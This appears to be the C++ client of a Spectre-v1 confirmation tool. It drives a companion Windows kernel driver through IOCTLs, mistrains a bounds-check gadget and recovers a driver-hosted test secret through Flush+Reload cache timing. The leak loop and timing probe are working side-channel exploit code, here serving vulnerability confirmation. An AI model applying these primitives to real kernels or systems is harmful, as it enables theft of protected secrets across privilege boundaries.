// client.cpp - user-mode driver for the SpecScout kernel-mode S1 confirmer.
//
// Reads a SpecScout JSON report, opens \\.\SpecScoutKC, maps the kernel reload
// buffer into this process, and for each S1 finding mistrains the kernel gadget's
// guard and recovers the driver's kernel secret through Flush+Reload on the shared
// buffer. A clean recovery proves the S1 class is exploitable at KERNEL privilege
// on this CPU; it does not execute the target binary's own code (see README).
//
// Build: see build.bat.  Run (after the driver is loaded):
//   kc_client <report.json> [--limit N | --all]
//
// x86-64 only (clflush / rdtscp).
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include <windows.h>
#include <intrin.h>

#include "../report_json.h"
#include "kc_common.h"

using ssconfirm::Finding;
using ssconfirm::load_report;

static HANDLE            g_dev   = INVALID_HANDLE_VALUE;
static volatile uint8_t* g_probe = nullptr;   // user mapping of the kernel reload buffer
static SSKC_INFO         g_info;

// Per-byte measurement effort. The cross-boundary path is noisier and slower than
// the in-process harness, so these are modest; raise them if recovery is weak.
static const int kTries  = 400;   // flush/trigger/probe cycles per byte
static const int kRounds = 40;    // train/mispredict sequences per trigger (one IOCTL)

static inline uint64_t probe(volatile uint8_t* p) {
    unsigned aux; _mm_mfence(); _mm_lfence();
    uint64_t t0 = __rdtscp(&aux); _mm_lfence();
    (void)*p; _mm_lfence();
    uint64_t t1 = __rdtscp(&aux); _mm_lfence();
    return t1 - t0;
}

static int threshold() {
    volatile uint8_t* p = &g_probe[0]; (void)*p;
    uint64_t hit = 0, miss = 0; const int N = 10000;
    for (int i = 0; i < N; i++) { (void)*p; hit += probe(p); }
    for (int i = 0; i < N; i++) { _mm_clflush((void*)p); _mm_mfence(); miss += probe(p); }
    hit /= N; miss /= N;
    printf("[calib] cached ~%llu  uncached ~%llu cyc\n",
           (unsigned long long)hit, (unsigned long long)miss);
    return (miss <= hit + 20) ? (int)(hit + 40) : (int)(hit + (miss - hit) / 4);
}

static bool run_batch(uint64_t malicious_x, uint64_t train_x, unsigned rounds) {
    SSKC_RUN in; in.malicious_x = malicious_x; in.train_x = train_x; in.rounds = rounds;
    DWORD ret = 0;
    return DeviceIoControl(g_dev, IOCTL_SSKC_RUN, &in, sizeof(in), nullptr, 0, &ret, nullptr) != 0;
}

static uint8_t leak_byte(int k, int thr, int* score_out) {
    const unsigned stride = g_info.stride;
    const int lines = (int)g_info.lines;
    uint64_t malicious_x = (uint64_t)(g_info.secret_delta + k);
    static int results[256];
    memset(results, 0, sizeof(results));
    for (int tries = kTries; tries > 0; tries--) {
        for (int i = 0; i < lines; i++) _mm_clflush((void*)&g_probe[i * stride]);
        _mm_mfence();
        uint64_t train_x = (uint64_t)(tries % (int)g_info.array1_size);
        run_batch(malicious_x, train_x, kRounds);   // kernel: train + mispredict xN
        uint64_t best = ~0ull; int best_i = -1;
        int exclude = g_info.array1[train_x % 16];
        for (int i = 0; i < lines; i++) {
            int mix = ((i * 167) + 13 + tries * 3) % lines;   // rotate vs prefetcher
            if (mix == exclude) continue;
            uint64_t t = probe(&g_probe[mix * stride]);
            if (t < best) { best = t; best_i = mix; }
        }
        if (best_i >= 0 && (int)best <= thr) results[best_i]++;
    }
    int top = 0;
    for (int i = 1; i < 256; i++) if (results[i] > results[top]) top = i;
    *score_out = results[top];
    return (uint8_t)top;
}

// Recover the kernel secret through the gadget at speculative distance `fill`.
static int confirm_kernel_s1(int thr, int fill, int* len_out, std::string* recovered) {
    SSKC_SETUP su; su.fill = (unsigned)fill; DWORD ret = 0;
    DeviceIoControl(g_dev, IOCTL_SSKC_SETUP, &su, sizeof(su), nullptr, 0, &ret, nullptr);

    int len = (int)g_info.secret_len, ok = 0;
    *len_out = len;
    if (recovered) recovered->clear();
    for (int i = 0; i < len; i++) {
        int score = 0;
        uint8_t v = leak_byte(i, thr, &score);
        char c = (v > 31 && v < 127) ? (char)v : '?';
        if (recovered) *recovered += c;
        if (score >= 5 && v == g_info.secret[i]) ok++;
    }
    return ok;
}

int main(int argc, char** argv) {
    std::string report;
    int limit = 20;
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "--limit") == 0 && i + 1 < argc) limit = std::atoi(argv[++i]);
        else if (std::strcmp(argv[i], "--all") == 0) limit = 0;
        else if (argv[i][0] != '-') report = argv[i];
    }
    if (report.empty()) {
        fprintf(stderr, "usage: kc_client <report.json> [--limit N | --all]\n");
        return 2;
    }

    std::string target;
    std::vector<Finding> fs;
    if (!load_report(report, target, fs)) {
        fprintf(stderr, "error: could not read report %s\n", report.c_str());
        return 2;
    }

    g_dev = CreateFileA(SSKC_WIN32_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "error: cannot open %s (err %lu). Is the driver loaded "
                        "(sc start SpecScoutKC) and are you elevated?\n",
                SSKC_WIN32_NAME, GetLastError());
        return 2;
    }

    DWORD ret = 0;
    if (!DeviceIoControl(g_dev, IOCTL_SSKC_INFO, nullptr, 0, &g_info, sizeof(g_info),
                         &ret, nullptr) || ret < sizeof(g_info)) {
        fprintf(stderr, "error: IOCTL_SSKC_INFO failed (err %lu)\n", GetLastError());
        CloseHandle(g_dev); return 2;
    }
    SSKC_MAP map = {};
    if (!DeviceIoControl(g_dev, IOCTL_SSKC_MAP, nullptr, 0, &map, sizeof(map),
                         &ret, nullptr) || !map.user_addr) {
        fprintf(stderr, "error: IOCTL_SSKC_MAP failed (err %lu)\n", GetLastError());
        CloseHandle(g_dev); return 2;
    }
    g_probe = (volatile uint8_t*)(uintptr_t)map.user_addr;

    SetThreadAffinityMask(GetCurrentThread(), 1ull << 2);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    int n_s1 = 0, n_s2 = 0;
    for (const Finding& f : fs) (f.is_s2() ? n_s2 : n_s1)++;

    int thr = threshold();
    printf("\n=== specscout_confirm (KERNEL) ===\n");
    printf("report  : %s\n", report.c_str());
    printf("target  : %s\n", target.empty() ? "(unknown)" : target.c_str());
    printf("findings: %zu  (S1=%d  S2=%d)\n", fs.size(), n_s1, n_s2);
    printf("secret  : %u bytes hosted in kernel; recovered via Flush+Reload on a\n"
           "          shared MDL buffer. Proves the S1 class leaks at KERNEL\n"
           "          privilege on this CPU, not execution of the target's code.\n\n",
           g_info.secret_len);

    int tested = 0, confirmed = 0, s2_skipped = 0;
    for (size_t i = 0; i < fs.size(); ++i) {
        const Finding& f = fs[i];
        printf("[#%zu] %-10s fn=0x%llx guard=0x%llx -> sink=0x%llx  dist=+%d\n",
               i, f.kind.c_str(), (unsigned long long)f.function,
               (unsigned long long)f.guard, (unsigned long long)f.sink, f.spec_distance);
        if (f.is_s2()) {
            printf("      S2 indirect-branch (BTB) confirmation is out of scope; "
                   "listed for manual review.\n\n");
            s2_skipped++;
            continue;
        }
        if (limit != 0 && tested >= limit) {
            printf("      (skipped: --limit %d reached; pass --all to test every finding)\n\n",
                   limit);
            continue;
        }
        int fill = f.spec_distance < 0 ? 0 : f.spec_distance;
        std::string rec;
        int len = 0, ok = confirm_kernel_s1(thr, fill, &len, &rec);
        tested++;
        bool good = ok >= len - 1;
        if (good) confirmed++;
        printf("      recovered %d/%d bytes \"%s\" -> %s\n\n", ok, len, rec.c_str(),
               good ? "S1 class EXPLOITABLE in kernel on this CPU"
                    : "not confirmed on this run");
    }

    printf("=== summary: %d/%d S1 tested confirmed in kernel; %d S2 for manual review ===\n",
           confirmed, tested, s2_skipped);
    CloseHandle(g_dev);
    return (tested > 0 && confirmed < tested) ? 1 : 0;
}
